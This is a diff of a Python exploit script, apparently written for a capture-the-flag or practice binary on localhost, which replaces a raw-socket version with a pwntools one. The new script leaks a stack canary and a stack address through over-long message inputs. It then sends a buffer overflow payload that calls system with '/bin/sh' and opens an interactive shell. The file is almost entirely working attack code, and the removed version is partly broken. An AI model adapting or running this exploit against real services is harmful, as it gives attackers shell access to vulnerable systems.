@@ -1,79 +1,38 @@
-#! /usr/bin/python
-# -*- coding: utf-8 -*-
-from socket import *
-from select import *
+from pwn import *
 import sys
-from time import ctime
-import time
-import pwn
-HOST = '127.0.0.1'
-PORT = int(sys.argv[1])
 
-BUFSIZE = 1024
-ADDR = (HOST,PORT)
+r = remote('localhost',int(sys.argv[1]))
 
-clientSocket = socket(AF_INET, SOCK_STREAM)# 서버에 접속하기 위한 소켓을 생성한다.
-
-try:
-    clientSocket.connect(ADDR)# 서버에 접속을 시도한다.
-    #clientSocket.send('Hello!'.encode())    # 서버에 메시지 전달
-    time.sleep(0.1)
-    print(clientSocket.recv(1024))
-
-except  Exception as e:
-    print('%s:%s'%ADDR)
-    sys.exit()
-
-a=["11","a"*41,"11","b"*40+'\x00']
-for raw_inputa in a:
-#canary leak
-    clientSocket.send(raw_inputa.encode())
-    msg = clientSocket.recv(1024)
-    if raw_inputa == "a"*41:
-        leaked_canary = "\x00"+msg[-3:]
-        canary = pwn.u32(leaked_canary)
-        print canary
-    else:
-        print(msg)
-    r.interactive()
-#system = 0x8048620
-system = 0x44444444
-binsh = 0xf7f660cf - 0x0f7de8000
-pay = ""
-pay += "a"*39
-pay += pwn.p32(canary)
-pay += 'b'*8
-pay += pwn.p32(system)
-print pay
-clientSocket.send(pay)
-msg = clientSocket.recv(1024)
-print(msg)
-#clientSocket.send(pay.encode())
-#msg=clientSocket.recv(1024)
-while 1:
-    clientSocket.send(raw_input().encode())
-    msg = clientSocket.recv(1024)
-    print(msg)
-print('connect is success')
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+def SelectMenu(contents):
+    msg = r.recvuntil("Select menu >")
+    print contents
+    r.sendline(contents)
+def InputMessage(contents):
+    msg = r.recvuntil("Input Your Message :")
+    print contents
+    r.send(contents) 
+    if contents == 'a'*41 :
+        r.recvuntil(contents)
+        leak = r.recv(3)
+        return '\x00'+ leak 
+    elif contents == 'a'*64 :
+        r.recvuntil(contents)
+        leak = r.recv(4)
+        return leak
+######### canary leak ############
+SelectMenu('1')
+canary = u32(InputMessage('a'*41))
+r.info(hex(canary))
+#####################################
+SelectMenu('1')
+stackmost = u32(InputMessage('a'*64))
+r.info(hex(stackmost))
+#####################################
+system = 0x8048620
+binsh = 0xf7f660cf - 0xf7de8000
+SelectMenu('1')
+pay = "c"*40 + p32(canary)+'\x00'*12 + p32(system) +"\x00"*4+p32(stackmost) +"\x00"*12 +"/bin/sh"
+#####################################
+InputMessage(pay)
+r.interactive()
 
